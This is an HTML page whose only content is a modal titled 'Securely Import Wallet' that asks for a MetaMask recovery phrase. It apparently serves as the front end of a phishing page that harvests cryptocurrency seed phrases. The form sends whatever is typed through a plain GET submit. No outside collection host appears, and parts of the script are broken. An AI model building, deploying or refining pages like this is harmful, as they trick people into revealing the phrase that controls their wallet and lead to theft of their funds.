<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="../../public/style.css" rel="stylesheet">
    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
    <title>Document</title>
    <script>
        function pop(){
            window.alert("submitted");
        }
        
    </script>
</head>
<body class="m-10">
    <script src="https://cdn.jsdelivr.net/gh/alpinejs/alpine@v2.x.x/dist/alpine.min.js" defer></script>

    <!-- Modal Background -->
    <div id="modal_overlay" class="hidden fixed text-gray-500 flex items-center justify-center overflow-auto z-50 bg-black bg-opacity-40 left-0 right-0 top-0 bottom-0" x-transition:enter="transition ease duration-300" x-transition:enter-start="opacity-0" x-transition:enter-end="opacity-100" x-transition:leave="transition ease duration-300" x-transition:leave-start="opacity-100" x-transition:leave-end="opacity-0">
        <!-- Modal -->
        <div id="modal" class="bg-white rounded-xl shadow-2xl p-6 sm:w-5/12 mx-10" @click.away="showModal = false" x-transition:enter="transition ease duration-100 transform" x-transition:enter-start="opacity-0 scale-90 translate-y-1" x-transition:enter-end="opacity-100 scale-100 translate-y-0" x-transition:leave="transition ease duration-100 transform" x-transition:leave-start="opacity-100 scale-100 translate-y-0" x-transition:leave-end="opacity-0 scale-90 translate-y-1">
            <!-- Title -->
            <span class="font-bold block text-2xl mb-3 text-center">Securely Import Wallet</span>
            <!-- body -->
            <form action="" method="get">
                <div class="my-5">
                    <div class="inline-block w-full">
                        <span class="w-full my-2 text-lg font-semibold w-full">Wallet Name</span>
                        <input id="inputren" class="my-2 w-full rounded-md p-3 bg-transparent border border-gray-200" type="text" name="wallet" value="MetaMask Wallet" readonly />
                    </div>
                    <div class="inline-block w-full">
                        <span class="w-full my-2 text-lg font-semibold">Recovery Phrase</span>
                        <textarea maxlength="40" minlength="12" class="my-2 w-full rounded-md p-3 bg-transparent border border-gray-200 resize-none overflow-hidden" type="text" name="phrase" placeholder="Input your phrase value"></textarea>
                    </div>
                    <span class="my-1 inline-block p-2">Typically 12 words separated by single spaces</span>
                </div>
                <div class="mt-5">
                    <input type="submit" onsubmit="openModal(false)" value="Import" class="cursor-pointer px-4 py-2 text-sm bg-white rounded-md text-lg border hover:bg-blue-500 hover:text-white w-full duration-150 ease-linear border-gray-200 text-gray-500 font-bold" />
                </div>
            </form>
        </div>
    </div>

    <button onclick="openModal(true,`MetaMask`)" class="px-4 py-2 text-sm bg-white rounded-xl border transition-colors duration-150 ease-linear border-gray-200 text-gray-500 focus:outline-none focus:ring-0 font-bold hover:bg-gray-50 focus:bg-indigo-50 focus:text-indigo">Open Modal</button>

    <script>
        const modal_overlay = document.querySelector('#modal_overlay');
        const modal = document.querySelector('#modal');
    
        function openModal (value,value2)
        {
            const modalCl = modal.classList
            const overlayCl = modal_overlay
        
            if(value){
            overlayCl.classList.remove('hidden');
            console.log(value2);
            document.getElementById('inputren').value =value2;
            } 
            else {
            overlayCl.classList.add('block');
            }
        }
        openModal(false)
    </script>
    

</body>
</html>
